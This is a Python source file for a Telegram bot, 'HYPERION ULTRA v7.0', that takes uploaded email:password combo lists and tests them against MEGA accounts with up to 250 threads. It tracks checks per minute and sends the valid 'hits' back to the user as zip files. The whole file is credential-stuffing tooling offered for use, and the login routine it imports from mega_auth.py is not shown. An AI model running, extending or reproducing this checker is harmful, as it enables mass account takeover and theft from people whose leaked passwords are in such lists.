#!/usr/bin/env python3
"""
🚀 HYPERION ULTRA TELEGRAM BOT v7.0 - REAL-TIME PERFORMANCE
===========================================================

Ultra-performance MEGA checker with Telegram interface
- Upload combo files directly to bot
- Real-time progress updates 
- 250 thread ultra performance
- Organized hit delivery
- Live system monitoring

"""

import asyncio
import time
import os
import sys
import gc
import zipfile
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
import psutil
from typing import List, Dict, Optional

# Telegram imports
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
from telegram.constants import ParseMode

# Import ultra authenticator
try:
    from mega_auth import UltraMegaAuthenticator
    MEGA_AUTH_AVAILABLE = True
    print("✅ Ultra MEGA authenticator loaded")
except ImportError:
    MEGA_AUTH_AVAILABLE = False
    print("❌ mega_auth.py not found - using fallback")

class UltraConfig:
    """Ultra performance configuration"""
    
    def __init__(self):
        # System specs
        self.cpu_cores = psutil.cpu_count()
        self.total_ram = psutil.virtual_memory().total / (1024**3)
        
        # Ultra performance settings
        self.max_threads = min(250, self.cpu_cores * 6)  # Ultra thread count
        self.target_cpu_usage = 85  # Target 85% CPU
        self.target_ram_usage = 75  # Target 75% RAM
        
        # File paths
        self.base_path = Path(__file__).parent
        self.combo_folder = self.base_path / "combos"
        self.hits_folder = self.base_path / "hits"
        self.backup_folder = self.base_path / "backups"
        
        # Create directories
        for folder in [self.combo_folder, self.hits_folder, self.backup_folder]:
            folder.mkdir(exist_ok=True)
        
        print(f"⚡ Ultra Config: {self.max_threads} threads, {self.cpu_cores} cores, {self.total_ram:.1f}GB RAM")

class TelegramRealTimeChecker:
    """Real-time MEGA checker with Telegram integration"""
    
    def __init__(self, config: UltraConfig):
        self.config = config
        self.stats = {
            'total_checked': 0,
            'hits': 0,
            'fails': 0,
            'errors': 0,
            'start_time': time.time(),
            'current_cpm': 0,
            'last_cpm_time': time.time(),
            'last_cpm_count': 0
        }
        self.running = False
        self.current_progress_msg = None
        
    async def start_real_time_checking(self, combo_data: List[str], update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Start real-time checking with Telegram updates"""
        chat_id = update.message.chat_id
        
        print(f"🚀 Starting REAL-TIME Telegram checking with {len(combo_data)} combos")
        
        # Send initial message
        progress_text = f"""
🚀 **HYPERION ULTRA v7.0 - REAL-TIME CHECKING**

📊 **Setup:**
• Combos: {len(combo_data):,}
• Threads: {self.config.max_threads}
• Mode: REAL-TIME TELEGRAM UPDATES

⚡ **Status:** Initializing ultra threads...
🔄 **Progress:** 0%
⏱️ **Time:** 0s
📈 **CPM:** 0
🎯 **Hits:** 0

🔥 **STARTING MAXIMUM SPEED CHECKING...**
"""
        
        self.current_progress_msg = await update.message.reply_text(
            progress_text, 
            parse_mode=ParseMode.MARKDOWN
        )
        
        # Start checking
        self.running = True
        self.stats['start_time'] = time.time()
        
        try:
            # Create ultra authenticator
            if not MEGA_AUTH_AVAILABLE:
                error_text = "❌ **Ultra authenticator not available**\n\nPlease ensure mega_auth.py is properly installed."
                await self.current_progress_msg.edit_text(error_text, parse_mode=ParseMode.MARKDOWN)
                return
            
            print(f"🔥 Initializing {self.config.max_threads} MEGA instances...")
            ultra_auth = UltraMegaAuthenticator(max_threads=self.config.max_threads)
            print(f"✅ {self.config.max_threads} MEGA instances ready!")
            
            # Prepare accounts
            accounts = []
            for line in combo_data:
                if ':' in line:
                    parts = line.split(':', 1)
                    if len(parts) == 2:
                        email, password = parts
                        accounts.append({'email': email.strip(), 'password': password.strip()})
            
            print(f"📤 Queuing {len(accounts):,} accounts for ultra checking...")
            
            # Start progress monitoring
            progress_task = asyncio.create_task(
                self.monitor_telegram_progress(len(accounts), chat_id, context)
            )
            
            # Start checking in thread pool
            def run_checking():
                try:
                    print(f"🔥 Starting {self.config.max_threads} ultra worker threads...")
                    results = ultra_auth.ultra_check_accounts(accounts, self.progress_callback)
                    print(f"✅ Checking complete!")
                    return results
                except Exception as e:
                    print(f"❌ Checking error: {e}")
                    return []
            
            # Run checking
            loop = asyncio.get_event_loop()
            with ThreadPoolExecutor(max_workers=1) as executor:
                results = await loop.run_in_executor(executor, run_checking)
            
            # Stop monitoring
            self.running = False
            progress_task.cancel()
            
            # Process results and send to user
            await self.process_telegram_results(results, chat_id, context)
            
        except Exception as e:
            self.running = False
            error_text = f"❌ **CHECKING ERROR**\n\n{str(e)}\n\nPlease try again or contact support."
            if self.current_progress_msg:
                await self.current_progress_msg.edit_text(error_text, parse_mode=ParseMode.MARKDOWN)
    
    def progress_callback(self, checked, total, stats):
        """Progress callback for ultra authenticator"""
        self.stats.update(stats)
        self.stats['total_checked'] = checked
        
        # Console progress for monitoring
        if checked % 100 == 0 or checked < 50:
            progress_percent = (checked / total * 100) if total > 0 else 0
            print(f"🔥 Progress: {checked:,}/{total:,} ({progress_percent:.1f}%) | CPM: {stats.get('current_cpm', 0):,} | Hits: {stats.get('hits', 0)}")
    
    async def monitor_telegram_progress(self, total_accounts: int, chat_id: int, context: ContextTypes.DEFAULT_TYPE):
        """Monitor and update progress in Telegram"""
        last_update = time.time()
        
        while self.running:
            try:
                current_time = time.time()
                
                # Update every 15 seconds for Telegram
                if current_time - last_update >= 15:
                    elapsed = current_time - self.stats['start_time']
                    
                    # Calculate metrics
                    progress_percent = (self.stats['total_checked'] / total_accounts * 100) if total_accounts > 0 else 0
                    eta_minutes = ((total_accounts - self.stats['total_checked']) / max(self.stats['current_cpm'] / 60, 0.001)) if self.stats['total_checked'] > 0 else 0
                    
                    # System resources
                    cpu_percent = psutil.cpu_percent()
                    ram_percent = psutil.virtual_memory().percent
                    
                    # Update CPM calculation
                    time_diff = current_time - self.stats['last_cpm_time']
                    if time_diff >= 60:  # Calculate CPM every minute
                        checks_in_period = self.stats['total_checked'] - self.stats['last_cpm_count']
                        self.stats['current_cpm'] = int(checks_in_period * 60 / time_diff) if time_diff > 0 else 0
                        self.stats['last_cpm_time'] = current_time
                        self.stats['last_cpm_count'] = self.stats['total_checked']
                    
                    # Update message
                    progress_text = f"""
🚀 **HYPERION ULTRA v7.0 - LIVE PROGRESS**

📊 **Progress:** {self.stats['total_checked']:,}/{total_accounts:,} ({progress_percent:.1f}%)
⚡ **CPM:** {self.stats['current_cpm']:,}
🎯 **Hits:** {self.stats['hits']}
❌ **Fails:** {self.stats['fails']}
⚠️ **Errors:** {self.stats['errors']}

⏱️ **Time:** {int(elapsed//60)}m {int(elapsed%60)}s
🕒 **ETA:** {int(eta_minutes)}m

💻 **System:**
• CPU: {cpu_percent:.1f}% / {self.config.target_cpu_usage}%
• RAM: {ram_percent:.1f}% / {self.config.target_ram_usage}%
• Threads: {self.config.max_threads}

🔥 **Status:** CHECKING AT MAXIMUM SPEED!
"""
                    
                    try:
                        if self.current_progress_msg:
                            await self.current_progress_msg.edit_text(progress_text, parse_mode=ParseMode.MARKDOWN)
                    except Exception as e:
                        print(f"❌ Progress update error: {e}")
                    
                    last_update = current_time
                
                await asyncio.sleep(2)  # Check every 2 seconds
                
            except Exception as e:
                print(f"❌ Progress monitor error: {e}")
                break
    
    async def process_telegram_results(self, results: List[Dict], chat_id: int, context: ContextTypes.DEFAULT_TYPE):
        """Process results and send to Telegram user"""
        if not results:
            final_text = "❌ **NO RESULTS**\n\nNo accounts were processed. Please check your combo file format."
            if self.current_progress_msg:
                await self.current_progress_msg.edit_text(final_text, parse_mode=ParseMode.MARKDOWN)
            return
        
        # Separate hits and fails
        hits = [r for r in results if r.get('status') == 'hit']
        fails = [r for r in results if r.get('status') == 'fail']
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        elapsed = time.time() - self.stats['start_time']
        
        # Save hits to file
        hit_files = []
        if hits:
            hits_file = self.config.hits_folder / f"hits_{timestamp}.txt"
            with open(hits_file, 'w', encoding='utf-8') as f:
                for hit in hits:
                    f.write(f"{hit['email']}:{hit['password']}\n")
            hit_files.append(hits_file)
            print(f"✅ {len(hits)} hits saved to {hits_file}")
        
        # Create zip with all hits for easy download
        if hit_files:
            zip_path = self.config.backup_folder / f"hits_package_{timestamp}.zip"
            with zipfile.ZipFile(zip_path, 'w') as zipf:
                for hit_file in hit_files:
                    zipf.write(hit_file, hit_file.name)
            
            # Send hits file to user
            with open(zip_path, 'rb') as f:
                await context.bot.send_document(
                    chat_id=chat_id,
                    document=f,
                    filename=f"HYPERION_HITS_{timestamp}.zip",
                    caption=f"🎯 **YOUR HITS ARE READY!**\n\n✅ {len(hits)} valid accounts found!"
                )
        
        # Final summary
        final_text = f"""
🎉 **CHECKING COMPLETE!**

📊 **RESULTS:**
✅ **Total Checked:** {len(results):,}
🎯 **Hits Found:** {len(hits)}
❌ **Invalid:** {len(fails)}
⏱️ **Time:** {int(elapsed//60)}m {int(elapsed%60)}s
⚡ **Average CPM:** {int(len(results) * 60 / elapsed) if elapsed > 0 else 0:,}

🔥 **Hit Rate:** {(len(hits) / len(results) * 100):.2f}%

{'🎁 **Hits delivered above!**' if hits else '💔 **No hits found in this combo**'}

Ready for next combo! 🚀
"""
        
        if self.current_progress_msg:
            await self.current_progress_msg.edit_text(final_text, parse_mode=ParseMode.MARKDOWN)

class HyperionUltraTelegramBot:
    """Ultra Telegram Bot v7.0"""
    
    def __init__(self):
        # Bot token - you need to set this
        self.bot_token = self.get_bot_token()
        
        if not self.bot_token:
            print("❌ No Telegram bot token found!")
            print("📝 Create token with @BotFather and set it in bot_token.txt")
            sys.exit(1)
        
        self.config = UltraConfig()
        self.checker = TelegramRealTimeChecker(self.config)
        self.application = None
    
    def get_bot_token(self):
        """Get bot token from file or environment"""
        # Try to read from file
        token_file = Path(__file__).parent / "bot_token.txt"
        if token_file.exists():
            return token_file.read_text().strip()
        
        # Try environment variable
        return os.getenv('TELEGRAM_BOT_TOKEN', '').strip()
    
    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /start command"""
        keyboard = [
            [
                InlineKeyboardButton("🚀 ULTRA CHECK", callback_data="ultra_check"),
                InlineKeyboardButton("📊 SYSTEM STATS", callback_data="system_stats")
            ],
            [
                InlineKeyboardButton("📁 MANAGE HITS", callback_data="manage_hits"),
                InlineKeyboardButton("💾 BACKUP ALL", callback_data="backup_all")
            ]
        ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        welcome_text = f"""
🚀 **HYPERION ULTRA TELEGRAM BOT v7.0**
═══════════════════════════════════════

**🔥 v7.0 TELEGRAM FEATURES:**
✅ Upload combo files directly to bot
✅ Real-time progress updates
✅ Live CPM, CPU, RAM monitoring
✅ Auto-organized hit delivery
✅ {self.config.max_threads} ultra threads
✅ Maximum performance optimization

**⚡ PERFORMANCE SPECS:**
🖥️ CPU Cores: {self.config.cpu_cores}
🧠 RAM: {self.config.total_ram:.1f}GB
⚡ Max Threads: {self.config.max_threads}
🎯 Target CPM: 10,000+

**📱 HOW TO USE:**
1. Click **🚀 ULTRA CHECK** below
2. Upload your combo file (.txt)
3. Watch real-time progress updates
4. Receive hits automatically!

**📁 FILE FORMAT:**
```
email1@example.com:password123
email2@example.com:password456
```

Ready for ultra-speed checking! 🔥
"""
        
        await update.message.reply_text(welcome_text, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
    
    async def handle_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle button callbacks"""
        query = update.callback_query
        await query.answer()
        
        if query.data == "ultra_check":
            await self.ultra_check_callback(query)
        elif query.data == "system_stats":
            await self.system_stats_callback(query)
        elif query.data == "manage_hits":
            await self.manage_hits_callback(query)
        elif query.data == "backup_all":
            await self.backup_all_callback(query)
    
    async def ultra_check_callback(self, query):
        """Ultra check callback"""
        text = f"""
🚀 **ULTRA CHECK v7.0 - READY!**

**Send your combo file now!** 📁

**✅ Supported formats:**
• .txt files only
• Format: email:password (one per line)
• Any size supported

**🔥 What happens next:**
• File uploaded instantly
• {self.config.max_threads} threads start immediately
• Real-time progress every 15 seconds
• Hits delivered automatically
• Complete results summary

**⚡ Ultra Performance:**
• CPM: Up to 10,000+
• CPU: {self.config.target_cpu_usage}% utilization
• RAM: {self.config.target_ram_usage}% utilization
• Live system monitoring

**Upload your combo file now!** 🚀
"""
        await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN)
    
    async def system_stats_callback(self, query):
        """System stats callback"""
        cpu_percent = psutil.cpu_percent()
        ram = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        
        # Count files
        combo_count = len(list(self.config.combo_folder.glob("*.txt")))
        hit_count = len(list(self.config.hits_folder.glob("*.txt")))
        backup_count = len(list(self.config.backup_folder.glob("*.zip")))
        
        text = f"""
📊 **HYPERION ULTRA v7.0 - SYSTEM STATUS**

**💻 System Resources:**
• CPU: {cpu_percent:.1f}% / {self.config.target_cpu_usage}%
• RAM: {ram.percent:.1f}% / {self.config.target_ram_usage}%
• RAM Free: {ram.available / (1024**3):.1f}GB
• Disk: {disk.percent:.1f}% used

**⚡ Performance Config:**
• Max Threads: {self.config.max_threads}
• CPU Cores: {self.config.cpu_cores}
• Target CPM: 10,000+

**📁 File Statistics:**
• Processed Combos: {combo_count}
• Hit Files: {hit_count}
• Backups: {backup_count}

**🔥 Status:** Ready for ultra checking! 🚀
"""
        await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN)
    
    async def manage_hits_callback(self, query):
        """Manage hits callback"""
        hit_files = list(self.config.hits_folder.glob("*.txt"))
        hit_files.sort(key=lambda x: x.stat().st_mtime, reverse=True)
        
        if hit_files:
            # Create zip with all hits
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            zip_path = self.config.backup_folder / f"all_hits_{timestamp}.zip"
            
            with zipfile.ZipFile(zip_path, 'w') as zipf:
                for hit_file in hit_files:
                    zipf.write(hit_file, hit_file.name)
            
            # Send the zip
            with open(zip_path, 'rb') as f:
                await query.message.reply_document(
                    document=f,
                    filename=f"ALL_HITS_{timestamp}.zip",
                    caption=f"📁 **ALL HITS PACKAGE**\n\n✅ {len(hit_files)} hit files included\n🔒 Organized and ready!"
                )
            
            text = f"✅ **{len(hit_files)} hit files delivered!**\n\nAll your hits organized and sent! 🎯"
        else:
            text = "📁 **No hit files found**\n\nComplete some checking to generate hits! 🚀"
        
        await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN)
    
    async def backup_all_callback(self, query):
        """Backup all data"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            backup_zip = self.config.backup_folder / f"full_backup_{timestamp}.zip"
            
            with zipfile.ZipFile(backup_zip, 'w') as zipf:
                # Backup combos
                for combo_file in self.config.combo_folder.glob("*.txt"):
                    zipf.write(combo_file, f"combos/{combo_file.name}")
                
                # Backup hits
                for hit_file in self.config.hits_folder.glob("*.txt"):
                    zipf.write(hit_file, f"hits/{hit_file.name}")
            
            # Send backup
            with open(backup_zip, 'rb') as f:
                await query.message.reply_document(
                    document=f,
                    filename=f"HYPERION_BACKUP_{timestamp}.zip",
                    caption="💾 **FULL BACKUP COMPLETE**\n\n✅ All data secured!"
                )
            
            text = "✅ **Backup complete!**\n\nAll your data has been backed up and sent! 🔒"
            
        except Exception as e:
            text = f"❌ **Backup error:** {str(e)}"
        
        await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN)
    
    async def handle_combo_file(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle uploaded combo file"""
        document = update.message.document
        
        if not document.file_name.endswith('.txt'):
            await update.message.reply_text("❌ **Invalid file type**\n\nPlease send a .txt file with email:password format")
            return
        
        try:
            # Download file
            file = await context.bot.get_file(document.file_id)
            
            # Save to combo folder
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            combo_file_path = self.config.combo_folder / f"combo_{timestamp}_{document.file_name}"
            
            await file.download_to_drive(combo_file_path)
            
            # Read combo data
            with open(combo_file_path, 'r', encoding='utf-8', errors='ignore') as f:
                combo_data = [line.strip() for line in f if ':' in line and line.strip()]
            
            if not combo_data:
                await update.message.reply_text("❌ **No valid combinations found**\n\nFormat: email:password (one per line)")
                return
            
            # Send confirmation
            await update.message.reply_text(f"✅ **Combo uploaded!**\n\n📊 Found {len(combo_data):,} accounts\n🚀 Starting ultra checking...")
            
            # Start real-time checking
            await self.checker.start_real_time_checking(combo_data, update, context)
            
        except Exception as e:
            await update.message.reply_text(f"❌ **Upload error:** {str(e)}\n\nPlease try again.")
    
    async def run(self):
        """Run the Telegram bot"""
        print("🚀 Starting HYPERION ULTRA TELEGRAM BOT v7.0...")
        
        # Create application
        self.application = Application.builder().token(self.bot_token).build()
        
        # Add handlers
        self.application.add_handler(CommandHandler("start", self.start_command))
        self.application.add_handler(CallbackQueryHandler(self.handle_callback))
        self.application.add_handler(MessageHandler(filters.Document.TXT, self.handle_combo_file))
        
        # Initialize and start
        await self.application.initialize()
        await self.application.start()
        await self.application.updater.start_polling()
        
        print("✅ HYPERION ULTRA TELEGRAM BOT v7.0 ONLINE!")
        print("🔥 Real-time Telegram updates enabled!")
        print("📱 Ready to receive combo files!")
        print("📁 Organized file structure active!")
        
        # Keep running
        try:
            while True:
                await asyncio.sleep(60)
        except KeyboardInterrupt:
            print("🛑 Bot stopped by user")
        finally:
            await self.application.stop()

async def main():
    """Main entry point"""
    print("""
🚀 HYPERION ULTRA TELEGRAM BOT v7.0
===================================

🔥 TELEGRAM BOT FEATURES:
• Upload combo files directly to bot
• Real-time progress updates every 15 seconds
• Live CPM, CPU, RAM monitoring
• Auto-organized hit delivery
• 250 thread ultra performance
• Instant hit file download

📱 TELEGRAM INTEGRATION:
• Interactive buttons and commands
• File upload and download
• Real-time status updates
• Organized hit management

⚡ STARTING TELEGRAM BOT...
""")
    
    try:
        bot = HyperionUltraTelegramBot()
        await bot.run()
    except Exception as e:
        print(f"❌ Bot error: {e}")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n🛑 Bot stopped by user")
    except Exception as e:
        print(f"❌ Fatal error: {e}")